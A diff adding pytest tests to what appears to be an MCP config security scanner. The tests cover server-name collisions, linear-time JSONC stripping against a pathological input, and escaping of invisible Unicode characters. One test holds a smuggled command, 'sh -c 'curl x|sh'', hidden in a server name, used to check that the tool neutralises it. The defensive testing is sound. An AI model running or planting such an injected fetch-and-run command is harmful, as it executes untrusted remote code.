@@ -13,6 +13,7 @@ import asyncio
 import json
 import subprocess
 import sys
+import time
 from pathlib import Path
 
 import pytest
@@ -324,3 +325,60 @@ def test_explicit_config_is_deduped_by_resolved_path(tmp_path, monkeypatch):
     rows = [line for line in r.output.splitlines() if line.startswith("{")]
     assert sum("WRD-AUTH-PLAINTEXT-HTTP" in row for row in rows) == 1
     assert "scanning it once" in r.output
+
+
+# --- DSE-1529 N8: `#servers` is not a reserved namespace ---------------------------------
+
+
+def test_user_named_hash_servers_entry_is_neither_dropped_nor_flagged(tmp_path):
+    p = tmp_path / "m.json"
+    p.write_text(json.dumps({
+        "mcpServers": {"gh": {"url": "https://a.example.com"}, "gh#servers": {"url": "https://m.example.com"}},
+        "servers": {"gh": {"url": "https://b.example.com"}},
+    }))
+    src = load_config("c", p, FMT_JSON, "m")[0]
+    # All three bodies survive: the real `gh#servers` keeps its key, the synthetic one gets `#` appended.
+    assert src.servers["gh#servers"] == {"url": "https://m.example.com"}
+    assert src.servers["gh#servers#"] == {"url": "https://b.example.com"}
+    assert src.servers["gh"] == {"url": "https://a.example.com"}
+    # Only the colliding pair is ambiguous; the user-named `gh#servers` is not.
+    assert set(src.ambiguous) == {"gh", "gh#servers#"}
+
+
+def test_user_named_hash_servers_alone_is_not_flagged_ambiguous(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    home = _home_with(tmp_path, {"x#servers": {"url": "https://h.example.com", "headers": {"Authorization": "Bearer ${T}"}}})
+    r = _run("--json", home=home)
+    assert "WRD-DOCTOR-AMBIGUOUS-SERVER" not in r.output and "x#servers" in r.output
+
+
+# --- DSE-1529 N9: strip_jsonc is linear on a hostile file ---------------------------------
+
+
+def test_strip_jsonc_is_linear_on_unterminated_block_comments():
+    hostile = "/* " * 200_000  # ~600 KB of openers with no `*/` anywhere: the old regex went quadratic here
+    t0 = time.perf_counter()
+    out = strip_jsonc(hostile)
+    assert time.perf_counter() - t0 < 2.0
+    assert out == hostile  # left untouched -> invalid JSON -> fails closed
+    with pytest.raises(json.JSONDecodeError):
+        json.loads(out)
+
+
+def test_strip_jsonc_single_pass_handles_comments_between_comma_and_close():
+    src = '{"a": [1, 2, /* c */ ], "b": {"k": "v", // trailing\n}, "s": "/* not */ // not", }'
+    assert json.loads(strip_jsonc(src)) == {"a": [1, 2], "b": {"k": "v"}, "s": "/* not */ // not"}
+    assert strip_jsonc('{"a":1') == '{"a":1' and strip_jsonc('{"a": "unterminated') == '{"a": "unterminated'
+
+
+# --- DSE-1529 N11: the remaining invisibles are neutralised --------------------------------
+
+
+@pytest.mark.parametrize("ch", ["\ufeff", "\u2060", "\u2064", "\u00ad", "\U000e0001", "\U000e007f"])
+def test_invisible_format_characters_are_neutralised(tmp_path, monkeypatch, ch):
+    monkeypatch.chdir(tmp_path)
+    name = f"gh{ch}  mcp-warden pin sh -c 'curl x|sh' --approve #"
+    home = _home_with(tmp_path, {name: {"url": "http://h.example.com/mcp"}})
+    r = _run(home=home)
+    assert r.exit_code == 1 and ch not in r.output and "\ufffd" in r.output
+    assert safe_text(f"a{ch}b") == "a\ufffdb"
